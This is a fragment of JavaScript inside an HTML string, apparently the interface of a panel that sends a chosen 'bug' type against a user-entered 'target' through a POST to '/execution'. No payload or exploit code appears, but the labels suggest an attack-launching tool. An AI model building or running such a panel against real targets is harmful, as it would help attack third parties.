sendBtn.innerHTML;\n                const bugText = dropdownSelected.querySelector('span').textContent;\n                const targetValue = targetInput.value.trim();\n                \n                // Loading State\n                sendBtn.innerHTML = '<i class=\"fa-solid fa-spinner fa-spin\"></i> PROCESSING...';\n                sendBtn.disabled = true;\n\n                try {\n                    const response = await fetch('/execution', {\n                        method: 'POST',\n                        headers: {\n                            'Content-Type': 'application/x-www-form-urlencoded',\n                        },\n                        body: new URLSearchParams({\n                            target: targetValue,\n                            mode: bugValueInput.value\n                        })\n                    });\n\n                    const result = await response.json();\n                    \n                    if (result.success) {\n                        modalTarget.textContent = targetValue;\n                        modalBug.textContent = bugText;\n\n                        successModal.classList.add('active');\n                    } else {\n                        alert(`Error: ${result.error || 'Failed to execute bug'}`);\n                    }\n                } catch (error) {\n                    console.error('Error:', error);\n                    alert('Failed to send bug request');\n                } finally {\n                    sendBtn.innerHTML = originalContent;\n                    sendBtn.disabled = false;\n                }\n            });\n\n            // Close Modal Logic\n            closeModalBtn.addEventListener('click', () => {\n                successModal.classList.remove('active');\n                targetInput.value = '';\n                dropdownSelected.querySelector('span').textContent = 'Select Type';\n                dropdownSelected.classList.add('empty');\n                bugValueInput.value = '';\n                dropdownOptionsList.forEach(opt => opt.classList.remove('selected'));\n                validateForm();\n            });\n            setInterval(async () => {\n                await fetchUserData();\n            }, 30000);\n        });\n    </script>\n</body>\n</html>";
};